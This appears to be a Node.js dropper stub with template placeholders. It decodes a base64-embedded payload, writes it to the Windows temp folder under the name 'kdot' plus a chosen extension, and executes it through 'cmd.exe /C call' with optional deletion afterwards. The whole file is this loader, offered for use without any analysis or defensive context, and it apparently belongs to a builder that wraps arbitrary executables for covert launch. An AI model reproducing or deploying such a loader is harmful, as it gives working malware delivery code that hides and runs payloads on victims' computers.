var fs = require('fs');
var os = require('os');
var path = require('path');
var spawn = require('child_process').spawn;

var file_ending = "YOUR_FILE_ENDING_HERE";
var remove = false;

function deleteTempFile(tempDir) {
    try {
        fs.unlinkSync(tempDir);
        console.log('Temp file deleted successfully.');
    } catch (err) {
        console.error('Error deleting temp file:');
    }
}


function main() {
    var tempDir = path.join(os.tmpdir(), "kdot." + file_ending);
    var b64stuff = "BASE64ENCODEDSTUFFHERE";
    var decoded = Buffer.from(b64stuff, 'base64');

    //const signalsToHandle = ['exit', 'SIGINT', 'SIGTERM', 'SIGABRT', 'SIGQUIT', 'SIGILL', 'SIGSEGV'];
    //signalsToHandle.forEach(signal => {
    //    process.on(signal, () => {
    //        console.log(`Received ${signal}. Exiting...`);
    //        deleteTempFile(tempDir);
    //        process.exit(0);
    //    });
    //});

    // This will handle uncaught exceptions
    //process.on('uncaughtException', (err) => {
    //    console.error('There was an uncaught error');
    //    try {
    //        fs.unlinkSync(tempDir);
    //    }
    //    catch (err) { }
    //    process.exit(1);
    //});

    fs.writeFile(tempDir, decoded, function (err) {
        if (err) {
            console.log("nah lol");
            return;
        }

        var cmdArgs = process.argv.slice(2);

        var allArgs = ["/C", "call", tempDir].concat(cmdArgs);

        var out = spawn("cmd.exe", allArgs, {
            stdio: 'inherit'
        });
        out.on('exit', function (code) {
            if (remove) {
                deleteTempFile(tempDir);
            }
        });
    });
}

main();